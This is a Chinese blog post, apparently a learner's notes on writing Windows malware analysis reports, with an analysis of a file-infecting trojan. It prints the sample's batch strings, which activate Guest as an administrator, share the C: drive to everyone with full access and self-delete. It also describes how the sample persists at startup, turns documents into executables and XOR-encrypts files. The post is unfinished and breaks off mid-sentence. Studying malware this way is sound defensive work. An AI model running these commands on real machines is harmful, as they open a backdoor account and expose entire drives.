---
title: PC分析报告撰写流程
date: 2019-12-05 18:04:25
tags: windows病毒分析
---

# 目标 

撰写PC样本分析报告

# 分析流程

## 详细分析报告流程

### 样本功能分析

1. 基础静态分析
2. 

### 报告撰写



# 实例

## 感染病毒分析

### 基础静态分析

1.执行shell命令，删除文件

2.COM组件操作

3.可能存在衍生PE文件

4.启动服务Server，添加Guest用户、激活并加入到管理员组中，紧接着创建c盘共享

```
导入函数
ShellExecuteA
CoCreateInstance
CoInitialize

资源文件
PE文件：E5BCC51B80BA1D91CB7179FB7A58FED7

字符串：
connect
send
Index.dat
.exe
=.doc
=.xls
=.jpg
=.rar
X.bat
del /a /f /q %0\r\nexit
net start Server\r\nnet user Guest Guest /add\r\nnet user Guest /active:yes\r\nnet user Guest Guest\r\nnet localgroup administrators Guest /add\r\n
net share C$=C: /grant:everyone,full\r\nnet share C$=C:\r\n
net start Server\r\nnet user Guest /active:no\r\ndel /a /f /q %0\r\nexit
```

## 高级分析

打开已存在"C:\Program Files\Common\Microsoft Shared\Index.dat"文件，判断文件开头两数据：

* 0x450：将Index.dat文件头修改成0x49，睡眠一段时间后提权关闭机器
* 0x451：将Index.dat文件头修改为0x50，睡眠一段时间后创建始终处于桌面最上层的全屏并没有任何控件的对话框并设置定时器间隔0.3s就会发送消息将对话框继续放到全屏位置，实现弹窗复位操作，以此来阻止用户手动关闭程序

利用COM组件在开机启动目录中创建快捷方式"C:\Users\15pb-win7\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\水印标签系统.lnk"，实现开机启动C:\Program Files\Common Files\Microsoft Shared\resvr.exe程序

![image-20191226103313003](D:\Blog\source\_posts\PC分析报告撰写流程\image-20191226103313003.png)

判断当前执行的进程模块是否为C:\Program Files\Common\Microsoft Shared\resvr.exe。针对这个判断分两种情况处理：

![image-20191226104541540](D:\Blog\source\_posts\PC分析报告撰写流程\image-20191226104541540.png)

如果当前模块是C:\Program Files\Common\Microsoft Shared\resvr.exe：睡眠1s，然后创建互斥体"40S118T2013"，成功后执行遍历桌面、其他盘符以及其子目录所有文件，如果全局变量dword_402120为0并且文件后缀为`.doc|.xls|.jpg|.rar`，将该文件和resvr.exe内容映射进内存空间

![image-20191226144249357](D:\Blog\source\_posts\PC分析报告撰写流程\image-20191226144249357.png)

将保存这种特定文件长度的地址替换掉内存中0x11111111（前2000字节数据中）后面四字节数据进行存放

将保存这种特定文件后缀的地址替换掉内存中0x222222222e（前2000字节数据中）后面3字节数据进行存放

每中特定文件类型对应一个数字：如.doc对应2，将这个数字存放在内存中的PE文件里资源节中的特定位置处，根据运行结果可以知道这个值决定文件图标的使用

![image-20191226152141295](D:\Blog\source\_posts\PC分析报告撰写流程\image-20191226152141295.png)

随后将修改好的内存数据前面PE文件部分重新写回被遍历的文件中，并且将文件后缀改成exe，如果出现同名则在原本后缀后面加上".exe"

![image-20191226154808774](D:\Blog\source\_posts\PC分析报告撰写流程\image-20191226154808774.png)

当全局变量为dword_402120="0xAABBCCDD"时，将文件映射进内存将其内容全部异或0x5FF80F64u进行简单加密

![image-20191226155456053](D:\Blog\source\_posts\PC分析报告撰写流程\image-20191226155456053.png)

创建线程

 

下面分析上面关于当前执行模块不是C:\Program Files\Common\Microsoft Shared\resvr.exe文件的两外两种情况。

1.当

## 参考

【1】[一个感染型木马病毒分析（一）](https://blog.csdn.net/QQ1084283172/article/details/47280673)

